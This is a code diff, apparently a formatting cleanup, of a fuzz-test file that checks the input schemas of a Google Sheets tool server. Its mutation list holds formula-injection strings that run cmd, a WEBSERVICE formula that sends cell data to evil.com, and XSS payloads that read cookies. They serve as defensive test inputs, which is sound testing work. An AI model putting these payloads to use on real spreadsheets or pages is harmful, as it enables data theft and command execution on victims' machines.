@@ -20,10 +20,7 @@
 
 import { describe, it, expect, beforeAll } from 'vitest';
 import { z } from 'zod';
-import {
-  generateAllFixtures,
-  getFixtureToolNames,
-} from '../audit/action-coverage-fixtures.js';
+import { generateAllFixtures, getFixtureToolNames } from '../audit/action-coverage-fixtures.js';
 import { TOOL_ACTIONS } from '../../src/mcp/completions.js';
 
 import { SheetsAuthInputSchema } from '../../src/schemas/auth.js';
@@ -92,7 +89,7 @@ const STRING_MUTATIONS = [
   '+CMD|" /C calc"!Z0',
   '-2+3+cmd|" /C calc"!A0',
   '@SUM(1+1)*cmd|" /C calc"!A0',
-  "=WEBSERVICE(\"http://evil.com/\"&A1)",
+  '=WEBSERVICE("http://evil.com/"&A1)',
   // XSS / HTML injection
   '<script>alert(document.cookie)</script>',
   '"><img src=x onerror=alert(1)>',
@@ -243,10 +240,7 @@ describe('Action Fuzzer — Invariant 1: safeParse never throws', () => {
   }
 
   it(`safeParse never throws across ${allFixtures.length} actions × ${STRING_MUTATIONS.length} string mutations`, () => {
-    expect(
-      thrown,
-      `safeParse threw unexpectedly:\n${thrown.slice(0, 10).join('\n')}`
-    ).toEqual([]);
+    expect(thrown, `safeParse threw unexpectedly:\n${thrown.slice(0, 10).join('\n')}`).toEqual([]);
   });
 });
 
@@ -287,8 +281,16 @@ describe('Action Fuzzer — Invariant 2: invalid request.action always rejected'
 describe('Action Fuzzer — Invariant 3: NaN and Infinity rejected for numeric action fields', () => {
   // Spot check on known numeric-heavy actions
   const NUMERIC_ACTIONS = [
-    { tool: 'sheets_dimensions', action: 'insert', fields: { dimension: 'ROWS', startIndex: 0, endIndex: 1 } },
-    { tool: 'sheets_dimensions', action: 'resize', fields: { dimension: 'ROWS', startIndex: 0, endIndex: 1, pixelSize: 30 } },
+    {
+      tool: 'sheets_dimensions',
+      action: 'insert',
+      fields: { dimension: 'ROWS', startIndex: 0, endIndex: 1 },
+    },
+    {
+      tool: 'sheets_dimensions',
+      action: 'resize',
+      fields: { dimension: 'ROWS', startIndex: 0, endIndex: 1, pixelSize: 30 },
+    },
     { tool: 'sheets_data', action: 'read', fields: { range: 'Sheet1!A1:B2' } },
   ];
 
@@ -372,14 +374,18 @@ describe('Action Fuzzer — Invariant 6: response intelligence never throws', ()
   ) => { batchingHint?: string };
 
   beforeAll(async () => {
-    const mod = await import(
-      '../../src/mcp/registration/response-intelligence.js'
-    );
+    const mod = await import('../../src/mcp/registration/response-intelligence.js');
     applyResponseIntelligence = mod.applyResponseIntelligence;
   });
 
   const RESPONSE_MUTATIONS = [
-    { action: 'read', values: [['Name', 'Age'], ['Alice', '30']] },
+    {
+      action: 'read',
+      values: [
+        ['Name', 'Age'],
+        ['Alice', '30'],
+      ],
+    },
     { action: 'read', values: [] },
     { action: 'read', values: [[]] },
     { action: 'read', values: null },
@@ -429,18 +435,14 @@ describe('Action Fuzzer — Coverage Summary', () => {
   it('fuzzer covers all tools in SCHEMA_REGISTRY', () => {
     const toolNames = getFixtureToolNames();
     const uncovered = toolNames.filter((t) => !SCHEMA_REGISTRY[t]);
-    expect(
-      uncovered,
-      `Tools without schema registry entry: ${uncovered.join(', ')}`
-    ).toEqual([]);
+    expect(uncovered, `Tools without schema registry entry: ${uncovered.join(', ')}`).toEqual([]);
   });
 
   it('fuzzer covers all tools in TOOL_ACTIONS', () => {
     const allToolActionKeys = Object.keys(TOOL_ACTIONS);
     const uncovered = allToolActionKeys.filter((t) => !SCHEMA_REGISTRY[t]);
-    expect(
-      uncovered,
-      `TOOL_ACTIONS tools not in fuzzer registry: ${uncovered.join(', ')}`
-    ).toEqual([]);
+    expect(uncovered, `TOOL_ACTIONS tools not in fuzzer registry: ${uncovered.join(', ')}`).toEqual(
+      []
+    );
   });
 });
